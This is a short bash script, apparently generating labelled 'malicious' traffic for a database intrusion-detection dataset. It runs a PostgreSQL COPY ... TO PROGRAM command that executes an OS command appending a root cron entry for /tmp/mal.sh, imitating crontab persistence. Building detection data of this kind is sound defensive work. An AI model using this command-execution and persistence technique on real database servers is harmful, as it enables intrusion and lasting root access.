#!/usr/bin/env bash
# 4D OOD workload -- adapted from ../attack_workload/attack_priv_var_crontab_persist.sh (legacy: casce_tpcb, -U postgres).
# Only connection and label changed; the OS command itself is unchanged.
set -u
REPEAT=${REPEAT:-1}
PSQL="psql -X -q -h 127.0.0.1 -d casce_banking"

echo "4D: OS command execution (crontab persistence), repeat ${REPEAT}..."
PGAPPNAME="casce_label=Malicious:os_crontab_persist_r${REPEAT}" \
  $PSQL -U teller -c "COPY (SELECT 1) TO PROGRAM 'echo '* * * * * root /tmp/mal.sh' >> /tmp/crontab.bak > /tmp/out_crontab_persist.txt 2>/dev/null || true';"
